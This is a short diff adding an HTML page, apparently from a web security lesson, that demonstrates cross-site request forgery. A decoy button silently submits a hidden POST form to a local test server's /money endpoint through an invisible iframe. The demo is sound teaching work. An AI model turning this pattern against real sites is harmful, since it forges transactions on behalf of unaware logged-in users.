@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Web Security - Malicious website</h1>
+    <p
+      >Hello, click on my ne pic<button id="btn_cat">Show me </button>
+    </p>
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form
+      method="POST"
+      action="http://localhost:3000/money"
+      target="csrf-frame"
+      id="csrf-form"
+    >
+    <input type="hidden" name="money" value="0">
+    </form>
+    <script type="text/javascript">
+      document.getElementById('btn_cat').addEventListener('click', () => {
+        document.getElementById('csrf-form').submit();
+      });
+    </script>
+  </body>
+</html>
